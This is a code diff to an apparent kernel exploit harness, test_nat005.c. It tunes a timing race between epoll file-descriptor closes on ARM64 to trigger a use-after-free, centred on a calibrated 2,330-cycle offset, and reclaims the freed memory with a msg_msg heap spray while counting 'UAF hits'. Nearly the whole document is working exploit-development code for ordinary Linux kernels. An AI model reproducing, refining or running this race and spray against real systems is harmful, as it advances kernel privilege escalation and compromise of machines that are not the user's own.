@@ -1,5 +1,5 @@
-// test_nat005.c — NAT-005: Closed-Loop Adaptive Launch-Ahead Search Harness
-// Concentrated 250-550 Cycle Critical Window Search with Near-Miss Timing Instrumentation
+// test_nat005.c — NAT-005: Calibrated Closed-Loop Adaptive Search Harness
+// Targets Empirically Measured 2,330 Cycle Critical Window Offset with Near-Miss Telemetry
 
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -20,8 +20,8 @@
 
 #define CACHE_LINE_SIZE 64
 #define TOTAL_TARGET_ITERATIONS 100000
+#define EMPIRICAL_TARGET_OFFSET 2330  // Empirically calibrated ARM64 cycle offset to 2nd epitem hlist_del_rcu write
 
-// ARM64 High-Resolution Cycle Counters
 static inline uint64_t get_cycles(void) {
     uint64_t val;
     asm volatile("mrs %0, cntvct_el0" : "=r" (val));
@@ -55,11 +55,8 @@ static int ep_outer = -1;
 static int ep_inner[2] = {-1, -1};
 static atomic_long uaf_hits = 0;
 
-// Telemetry timestamps per trial
 static volatile uint64_t t_a_start = 0;
-static volatile uint64_t t_a_end = 0;
 static volatile uint64_t t_b_close_start = 0;
-static volatile uint64_t t_b_close_end = 0;
 
 void *bounce_worker(void *arg) {
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
@@ -81,7 +78,6 @@ void *adaptive_thread_a(void *arg) {
 
     t_a_start = get_cycles();
     close(ep_outer);
-    t_a_end = get_cycles();
     return NULL;
 }
 
@@ -98,7 +94,6 @@ void *adaptive_thread_b(void *arg) {
 
     t_b_close_start = get_cycles();
     close(ep_inner[1]);
-    t_b_close_end = get_cycles();
 
     // Reclaim spray via msg_msg (144 bytes user payload -> kmalloc-192)
     int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
@@ -123,7 +118,6 @@ void *adaptive_thread_b(void *arg) {
     return NULL;
 }
 
-// Executes a single trial and returns the timing delta (t_b_close_start - t_a_start)
 int64_t run_adaptive_trial(uint64_t delay_cycles) {
     current_launch_delay = delay_cycles;
     atomic_store(&sync_go, 0);
@@ -159,7 +153,6 @@ int64_t run_adaptive_trial(uint64_t delay_cycles) {
     close(p0[0]); close(p0[1]);
     close(p1[0]); close(p1[1]);
 
-    // Calculate relative timing delta between Thread B close and Thread A start
     int64_t delta = (int64_t)t_b_close_start - (int64_t)t_a_start;
     return delta;
 }
@@ -168,10 +161,10 @@ int main(void) {
     char log_buf[384];
     uint64_t frq = get_cntfrq();
     snprintf(log_buf, sizeof(log_buf),
-             "[NAT-005] Starting Closed-Loop Adaptive Search in Critical Window (250-550 cycles, freq: %lu Hz)\n", frq);
+             "[NAT-005] Starting Calibrated Closed-Loop Search (Real Target: %d cycles, freq: %lu Hz)\n",
+             EMPIRICAL_TARGET_OFFSET, frq);
     print_msg(log_buf);
 
-    // Start background cache bounce thread on CPU 1
     pthread_t tbounce;
     atomic_store(&stop_bounce, 0);
     pthread_create(&tbounce, NULL, bounce_worker, NULL);
@@ -181,19 +174,18 @@ int main(void) {
     uint64_t best_delay_setting = 0;
 
     // ------------------------------------------------------------
-    // Phase 1: Fine-Grained Critical Window Sweep (250-550 cycles, step=10 cycles)
-    // 31 steps x 2,800 iterations = 86,800 iterations (86.8% of total budget)
+    // Phase 1: Fine-Grained Search Centered on Calibrated Target (2180..2480 cycles, step=10)
+    // 31 steps x 2,800 iterations = 86,800 iterations (86.8% budget)
     // ------------------------------------------------------------
-    print_msg("[NAT-005] Phase 1: Executing Fine-Grained Critical Window Sweep (250..550 cycles, step=10)...\n");
+    print_msg("[NAT-005] Phase 1: Executing Fine-Grained Sweep Centered on 2,330 Cycles (2180..2480, step=10)...\n");
 
-    for (uint64_t delay = 250; delay <= 550; delay += 10) {
+    for (uint64_t delay = 2180; delay <= 2480; delay += 10) {
         int64_t step_min_delta = 999999;
         for (int i = 0; i < 2800; i++) {
             int64_t delta = run_adaptive_trial(delay);
             completed_iterations++;
 
-            // Near-miss metric: target alignment is ~350 cycles relative to t_a_start
-            int64_t alignment_err = labs(delta - 350);
+            int64_t alignment_err = labs(delta - EMPIRICAL_TARGET_OFFSET);
             if (alignment_err < step_min_delta) {
                 step_min_delta = alignment_err;
             }
@@ -205,26 +197,26 @@ int main(void) {
         }
 
         snprintf(log_buf, sizeof(log_buf),
-                 "[NAT-005] Critical Window Delay=%lu cycles: %ld iterations complete | best_alignment_err=%ld cycles\n",
+                 "[NAT-005] Calibrated Window Delay=%lu cycles: %ld iterations complete | best_alignment_err=%ld cycles\n",
                  delay, completed_iterations, step_min_delta);
         print_msg(log_buf);
     }
 
     // ------------------------------------------------------------
-    // Phase 2: Outer Boundary Sweep (100..240 and 560..800 cycles, step=20 cycles)
-    // 20 steps x 660 iterations = 13,200 iterations (13.2% of total budget)
+    // Phase 2: Outer Boundary Sweep (2000..2160 and 2500..2660 cycles, step=20)
+    // 20 steps x 660 iterations = 13,200 iterations (13.2% budget)
     // Total iterations = 86,800 + 13,200 = 100,000
     // ------------------------------------------------------------
-    print_msg("[NAT-005] Phase 2: Executing Boundary Sweep (100..240 and 560..800 cycles, step=20)...\n");
+    print_msg("[NAT-005] Phase 2: Executing Outer Boundary Sweep (2000..2160 and 2500..2660 cycles, step=20)...\n");
 
-    for (uint64_t delay = 100; delay <= 240; delay += 20) {
+    for (uint64_t delay = 2000; delay <= 2160; delay += 20) {
         for (int i = 0; i < 330; i++) {
             run_adaptive_trial(delay);
             completed_iterations++;
         }
     }
 
-    for (uint64_t delay = 560; delay <= 800; delay += 20) {
+    for (uint64_t delay = 2500; delay <= 2660; delay += 20) {
         for (int i = 0; i < 330; i++) {
             run_adaptive_trial(delay);
             completed_iterations++;
@@ -235,13 +227,15 @@ int main(void) {
     pthread_join(tbounce, NULL);
 
     snprintf(log_buf, sizeof(log_buf),
-             "[NAT-005] Closed-Loop Adaptive Search FINAL RESULT:\n"
+             "[NAT-005] Calibrated Closed-Loop Search FINAL RESULT:\n"
              "  - Total Iterations: %ld / %d\n"
-             "  - Critical Window Focus: 250-550 cycles (step=10, 86.8%% budget)\n"
+             "  - Empirically Calibrated Target: %d cycles\n"
+             "  - Critical Window Focus: 2180-2480 cycles (step=10, 86.8%% budget)\n"
              "  - Best Delay Alignment Setting: %lu cycles\n"
              "  - Closest Near-Miss Alignment Error: %ld cycles\n"
              "  - Total UAF Hits: %ld\n",
-             completed_iterations, TOTAL_TARGET_ITERATIONS, best_delay_setting, min_near_miss_delta, atomic_load(&uaf_hits));
+             completed_iterations, TOTAL_TARGET_ITERATIONS, EMPIRICAL_TARGET_OFFSET,
+             best_delay_setting, min_near_miss_delta, atomic_load(&uaf_hits));
     print_msg(log_buf);
 
     reboot(RB_POWER_OFF);
